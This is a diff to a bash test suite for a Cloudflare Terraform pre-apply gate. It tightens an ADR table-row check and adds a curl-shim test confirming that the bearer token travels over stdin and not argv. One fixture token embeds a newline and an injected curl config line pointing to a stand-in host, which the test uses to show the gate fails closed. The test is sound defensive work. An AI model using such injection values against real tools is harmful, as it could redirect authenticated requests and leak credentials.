@@ -577,6 +577,8 @@ ADJUDICATED_OUT=(
   "cloudflare_bot_management"
   "cloudflare_list"
   "cloudflare_notification_policy"
+  "cloudflare_pages_domain"
+  "cloudflare_pages_project"
   "cloudflare_record"
   "cloudflare_zero_trust_access_application"
   "cloudflare_zero_trust_access_policy"
@@ -614,8 +616,21 @@ t_parity_all_types_adjudicated() {
   fi
 }
 
-# P2: ADR-136 names every adjudicated-OUT type — so the ADR and this test cannot
-#     drift (the coupling the plan requires).
+# P2: ADR-136 ADJUDICATES every adjudicated-OUT type — so the ADR and this test
+#     cannot drift (the coupling the plan requires).
+#
+# ANCHORED ON THE TABLE ROW, NOT ON THE BARE TOKEN. This was `grep -Fq "$t"`,
+# which asked only whether the name appears ANYWHERE in the ADR. Prose naming a
+# type — a caveat paragraph, a forward note about a sibling class — satisfied
+# that, so the type's actual adjudication row could be deleted with this test
+# still green. Measured, not theorised: adding a paragraph that mentions
+# `cloudflare_pages_project` and then deleting its table row left the suite at
+# 43/43. The bare-token form was vacuous for exactly the class of type this
+# gate exists to force a decision about (cq-assert-anchor-not-bare-token).
+#
+# The anchor requires a table ROW whose FIRST cell code-spans the type AND
+# whose row carries an OUT verdict. Backticks delimit the type, so
+# `cloudflare_zero_trust_tunnel_cloudflared` does not match the `_config` row.
 t_parity_adr_lists_out_set() {
   if [[ ! -f "$ADR133" ]]; then
     _report "P2 ADR-136 lists the adjudicated-OUT set" fail "missing $ADR133"
@@ -623,12 +638,12 @@ t_parity_adr_lists_out_set() {
   fi
   local t missing=()
   for t in "${ADJUDICATED_OUT[@]}"; do
-    grep -Fq "$t" "$ADR133" || missing+=("$t")
+    grep -Eq "^\|[^|]*\`${t}\`.*\| *OUT" "$ADR133" || missing+=("$t")
   done
   if [[ "${#missing[@]}" -eq 0 ]]; then
-    _report "P2 ADR-136 names every adjudicated-OUT type (ADR↔test coupling)" ok
+    _report "P2 ADR-136 has an OUT-verdict table row for every adjudicated-OUT type (ADR↔test coupling)" ok
   else
-    _report "P2 ADR-136 lists the adjudicated-OUT set" fail "absent from ADR-136: ${missing[*]}"
+    _report "P2 ADR-136 lists the adjudicated-OUT set" fail "no OUT-verdict table row in ADR-136 for: ${missing[*]}"
   fi
 }
 
@@ -828,7 +843,59 @@ t_audit_live_stub() {
   fi
 }
 
+# TR1: the REAL transport (_default_curl), driven against a PATH-shimmed `curl` that records its
+#      argument list and its stdin (#7797). The bearer must ride curl's stdin config channel
+#      (`--config -`), never argv; `--disable` must be the first argument; `--noproxy '*'` present.
+#      A token whose shape could inject a curl config line makes ZERO requests and fails closed.
+t_default_curl_bearer_on_stdin() {
+  local d tok="SynthCfTokenNotReal0123456789_-ab" out rc=0
+  d="$(mktemp -d -t preapply-tr1.XXXXXXXX)"
+  cat > "$d/curl" <<'SHIM_EOF'
+#!/usr/bin/env bash
+printf '%s\n' "$@" >> "$TR1_DIR/argv"
+cfg=""; prev=""; url=""
+for a in "$@"; do
+  [[ "$prev" == "--config" ]] && cfg="$a"
+  case "$a" in https://*) url="$a" ;; esac
+  prev="$a"
+done
+if [[ "$cfg" == "-" ]]; then cat >> "$TR1_DIR/stdin"; fi
+printf 'x\n' >> "$TR1_DIR/calls"
+if [[ "$url" == *phases/http_request_dynamic_redirect/entrypoint ]]; then
+  printf '{"result":{"id":"ctrl","rules":[{"ref":"c"}]}}\n200'
+else
+  printf '\n404'
+fi
+SHIM_EOF
+  chmod +x "$d/curl"; : > "$d/argv"; : > "$d/stdin"; : > "$d/calls"
+  out="$(
+    PATH="$d:$PATH" TR1_DIR="$d" PREAPPLY_CF_TOKEN="$tok" PREAPPLY_CF_ZONE_ID="test-zone" \
+    bash "$GATE" --gate "$FIXTURES/tfplan-ruleset-create.json" 2>&1
+  )" || rc=$?
+  local first; first="$(sed -n '1p' "$d/argv")"
+  if [[ "$rc" -eq 0 && -s "$d/calls" && "$first" == "--disable" ]] \
+     && grep -qxF -- '--noproxy' "$d/argv" && grep -qxF -- '--config' "$d/argv" \
+     && ! grep -qF -- "$tok" "$d/argv" && ! grep -qiF -- 'Authorization' "$d/argv" \
+     && [[ "$(sort -u "$d/stdin")" == "header = \"Authorization: Bearer ${tok}\"" ]]; then
+    _report "TR1 the bearer reaches curl on stdin (--config -), is absent from argv, --disable is first, --noproxy set" ok
+  else
+    _report "TR1 bearer channel" fail "rc=$rc first=$first calls=$(grep -c '' "$d/calls") out=$(tr '\n' '|' <<<"$out")"
+  fi
+  : > "$d/argv"; : > "$d/stdin"; : > "$d/calls"; rc=0
+  out="$(
+    PATH="$d:$PATH" TR1_DIR="$d" PREAPPLY_CF_TOKEN=$'TR1BADFP\nurl = "https://evil.example/"' PREAPPLY_CF_ZONE_ID="test-zone" \
+    bash "$GATE" --gate "$FIXTURES/tfplan-ruleset-create.json" 2>&1
+  )" || rc=$?
+  if [[ "$rc" -ne 0 && ! -s "$d/calls" ]] && grep -Eq 'unexpected shape' <<<"$out" && ! grep -qF 'TR1BADFP' <<<"$out"; then
+    _report "TR1b an unusable-shape token fails closed with ZERO requests and is never echoed" ok
+  else
+    _report "TR1b unusable-shape token" fail "rc=$rc calls=$(grep -c '' "$d/calls") out=<redacted>"
+  fi
+  rm -rf "$d"
+}
+
 # --- Run all -----------------------------------------------------------------
+t_default_curl_bearer_on_stdin
 t_clobber_blocks
 t_empty_404_passes
 t_empty_200_passes
